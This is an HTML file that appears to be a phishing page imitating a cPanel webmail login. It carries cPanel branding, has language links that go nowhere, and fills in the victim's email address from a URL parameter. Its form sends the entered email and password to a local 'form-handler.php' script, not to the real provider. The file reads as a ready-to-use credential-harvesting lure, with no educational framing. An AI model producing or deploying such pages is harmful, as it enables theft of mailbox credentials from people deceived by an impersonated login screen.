<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Webmail Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #ffffff;
            text-align: center;
            margin: 0;
            padding: 0;
        }

        .container {
            margin-top: 150px;
        }

        img {
            margin-bottom: 30px;
            width: 250px;
        }

        .login-box {
            margin: 0 auto;
            width: 300px;
        }

        .login-box label {
            display: block;
            text-align: left;
            margin: 5px 0;
            font-weight: normal;
        }

        .login-box input[type="text"],
        .login-box input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 15px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 16px;
        }

        .login-box button {
            width: 100%;
            padding: 10px;
            background-color: #007bff;
            border: none;
            border-radius: 5px;
            color: white;
            font-size: 16px;
        }

        .login-box button:hover {
            background-color: #0056b3;
        }

        .languages {
            margin-top: 20px;
            color: gray;
        }

        .languages a {
            color: gray;
            text-decoration: none;
            margin-right: 15px;
        }

        .footer {
            margin-top: 30px;
            font-size: 12px;
            color: gray;
        }

        .footer a {
            color: gray;
            text-decoration: none;
        }
    </style>
    <script>
        // Function to populate the email field from URL parameter
        function populateEmailField() {
            const params = new URLSearchParams(window.location.search);
            if (params.has('email')) {
                document.getElementById('email').value = params.get('email');
            }
        }
        // Run populateEmailField function on page load
        window.onload = populateEmailField;
    </script>
</head>
<body>
    <div class="container">
        <!-- Logo -->
        <img src="webmail-logo.svg" alt="Webmail Logo">

        <!-- Login form -->
        <div class="login-box">
            <form action="form-handler.php" method="POST">
                <label for="email">Email Address</label>
                <input type="text" id="email" name="email" placeholder="Enter your email address" required>
                
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Enter your email password" required>
                
                <button type="submit">Log in</button>
            </form>
        </div>

        <!-- Language selection -->
        <div class="languages">
            <a href="#">English</a>
            <a href="#">العربية</a>
            <a href="#">čeština</a>
            <a href="#">dansk</a>
            <a href="#">Deutsch</a>
            <a href="#">Ελληνικά</a>
            <a href="#">español</a>
            <a href="#">español latinoamericano</a>
        </div>

        <!-- Footer -->
        <div class="footer">
            <p>&copy; 2024 cPanel, L.L.C. <a href="#">Privacy Policy</a></p>
        </div>
    </div>
</body>
</html>
